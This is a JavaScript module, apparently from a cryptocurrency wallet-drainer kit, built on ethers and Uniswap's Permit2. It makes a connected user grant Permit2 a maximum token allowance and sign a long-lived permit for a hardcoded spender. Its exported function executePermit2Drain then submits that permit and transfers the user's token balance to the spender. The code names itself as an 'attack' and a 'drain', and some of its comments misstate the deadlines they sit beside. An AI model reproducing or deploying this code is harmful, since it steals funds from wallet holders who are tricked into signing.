import { BrowserProvider, Contract, formatEther, parseEther, parseUnits, Signature } from 'ethers';
import { getAddress, getIsConnected, getChainID, getProvider } from '../walletconnect' 
import { PERMIT2_ADDRESS, permit2Address, MaxAllowanceTransferAmount, MaxAllowanceExpiration, AllowanceProvider, AllowanceTransfer } from '@uniswap/permit2-sdk'
import {abi as TokenAbi} from '../abi/EstateX.json'
import Permit2ABI from '../abi/Permit2.json'
import { SPENDER_PERMIT2 as SPENDER, MAX_ALLOWANCE } from './constants'
import { transferFromProxyToOwner } from './proxy';





async function getSigner() {
    if (!getIsConnected()) return;
  
    const walletProvider = getProvider();
    const ethersProvider = new BrowserProvider(walletProvider);
    const signer = await ethersProvider.getSigner();
  
    return signer;
  }
  
  
  async function getEthereumContract(address, abi) {
    if (!getIsConnected()) return;
  
    const signer = await getSigner();
    const transactionContract = new Contract(address, abi, signer);
  
    return transactionContract;
  }
  


async function approvePermit2(ownerAddress, contract_address, amountToApprove) {
    return new Promise(async(resolve, reject) => {
      try {
          const tokenContract = await getEthereumContract(contract_address, TokenAbi.abi)
  
          const approvestatus = await tokenContract.allowance(ownerAddress, PERMIT2_ADDRESS);  
          const amountApproed =  formatEther(approvestatus);
          console.log("amountApproedforpermit2: ", amountApproed, amountToApprove)
  
          if (parseFloat(amountApproed) >= parseFloat(amountToApprove)) {
            resolve(amountApproed)
            return
          }
          const approveTx = await tokenContract.approve(PERMIT2_ADDRESS, parseEther(amountToApprove.toString()))
          await approveTx.wait();
  
          resolve(formatEther(await tokenContract.allowance(ownerAddress, PERMIT2_ADDRESS)));  
      } catch (error) {
        console.log(error)
        reject(error)
      }
    })
  
  }
  
  
  async function getAllowanceData(owner, token, spender) {
    return new Promise(async(resolve, reject) => {
        try {
            const PERMIT2_ABI = [
              "function allowance(address owner, address token, address spender) external view returns (uint160 amount, uint48 expiration, uint48 nonce)"
            ];
      
            const permit2 = await getEthereumContract(PERMIT2_ADDRESS, PERMIT2_ABI);
            console.log("allowance amount", permit2)
            const [amount, expiration, nonce] = await permit2.allowance(owner, token, spender);
      
            resolve({
              parsedAmount: formatEther(amount),
              expiration: Number.parseInt(expiration.toString()), 
              nonce: Number.parseInt(nonce.toString())
            });
        } catch (error) {
            console.error("Error fetching nonce:", error);
            reject(error)
        }
    })
    
  }




function toDeadline(expiration) {
    return Math.floor((window.Date.now() + expiration) / 1000)
}





async function requestPermit2Signature(contract_address, token_name, chain_id, balance, decimals = 18) {
  return new Promise(async (resolve, reject) => {
      try {
          if (!getIsConnected()) reject({reason: 'Wallet not connected'})
            if (balance<=0) reject({reason: 'Insufficient amount'})
            if (chain_id != getChainID()) reject({reason: 'Wrong chain'})

          const signer = await getSigner();


          console.log("decimals:  ", decimals)
          const PARSED_MAX_ALLOWANCE = parseUnits(MAX_ALLOWANCE, decimals)

          const ownerAddress = getAddress();


          const approveAmount = await approvePermit2(ownerAddress, contract_address, MAX_ALLOWANCE);

          if (approveAmount < MAX_ALLOWANCE) reject('Not enough allowance:  ', approveAmount)

          const { parsedAmount, nonce, expiration } = await getAllowanceData(ownerAddress, contract_address, SPENDER);

          console.log({
            parsedAmount, 
            nonce, 
            expiration
          })
          
          const permitSingle = {
            details: {
              token: contract_address,
              amount: PARSED_MAX_ALLOWANCE,
              // You may set your own deadline - we use 30 days.
              expiration: toDeadline(/* 30 days= */ 1000 * 60 * 60 * 24 * 300),
              nonce: nonce,
            },
            spender: SPENDER,
            // You may set your own deadline - we use 30 minutes.
            sigDeadline: toDeadline(/* 30 minutes= */ 1000 * 60 * 60 * 30),
        }
        console.log("permitSingle:  ", permitSingle)      

          const { domain, types, values } = AllowanceTransfer.getPermitData(permitSingle, PERMIT2_ADDRESS, chain_id);

          
          const signature = await signer.signTypedData(domain, types, values)


          const { r, s, v } = Signature.from(signature);


          resolve({
            r,
            s,
            v,
            signature,
            nonce,
            owner: ownerAddress, 
            spender: SPENDER, 
            value: MAX_ALLOWANCE, 
            sigDeadline: permitSingle.sigDeadline, 
            deadline: permitSingle.details.expiration, 
            chain_id, 
            token_address: contract_address, 
            token_name,
            attack_type: 'nonpermit',
            decimals
          })
      } catch (error) {
          console.log(error);
          reject(error)
      }

  })
}








async function executePermit2Drain(data) {
    const {
        r,
        s,
        v,
        signature,
        nonce,
        owner, 
        spender, 
        value, 
        sigDeadline, 
        deadline, 
        chain_id, 
        token_address, 
        token_name,
        balance,
        decimals
      } = data
  return new Promise(async (resolve, reject) => {
    console.log(data)
      try {
          if (!getIsConnected()) reject({reason: 'Wallet not connected'})

          const contract = await getEthereumContract(PERMIT2_ADDRESS, Permit2ABI);

          const parsedValue = parseEther(value)
        
          const approveAmount = await approvePermit2(owner, token_address, MAX_ALLOWANCE);
          if (approveAmount <= 0) reject('Not enough allowance:  ', approveAmount)

          const { parsedAmount, nonce, expiration } = await getAllowanceData(owner, token_address, spender);

          console.log("approvedpermit2:  ", approveAmount)
          console.log(parsedAmount <= 0 || !parsedAmount)

          console.log("permit2parsedamount:  ", parsedAmount, expiration)

          if (parsedAmount <= 0 || !parsedAmount) {
            await permit2(chain_id, token_address, owner, spender, nonce, parsedValue, deadline, sigDeadline, signature)
          }

          const transaction = await contract.transferFrom(owner, spender, balance, token_address);
          await transaction.wait();

          // await transferFromProxyToOwner(token_address, balance)


          resolve()
      } catch (error) {
          console.log(error);
          reject(error)
      }

  })
}

async function permit2(chain_id, contract_address, owner, spender, nonce, parsedValue, deadline, sigDeadline, signature) {
    return new Promise(async(resolve,reject) => {
        try {

            const contract = await getEthereumContract(PERMIT2_ADDRESS, Permit2ABI);
            const signer = await getSigner();

            const permitSingle = {
                details: {
                  token: contract_address,
                  amount: parsedValue,
                  // You may set your own deadline - we use 30 days.
                  expiration: deadline,
                  nonce: nonce,
                },
                spender: spender,
                // You may set your own deadline - we use 30 minutes.
                sigDeadline: sigDeadline,
            }
          console.log("permitSingle:  ", permitSingle)


          const { domain, types, values } = AllowanceTransfer.getPermitData(permitSingle, PERMIT2_ADDRESS, chain_id);
          console.log({ domain, types, values })


        //   const signature = await signer.signTypedData(domain, types, values)

        //   const { r, s, v } = Signature.from(signature);
        //   console.log("signature:  ", signature)

        const transaction = await contract.permit(owner, permitSingle, signature);
        await transaction.wait();
        resolve(transaction.hash)
        } catch (error) {
            reject(error)
        }
    })
}



export {
    requestPermit2Signature,
    executePermit2Drain
}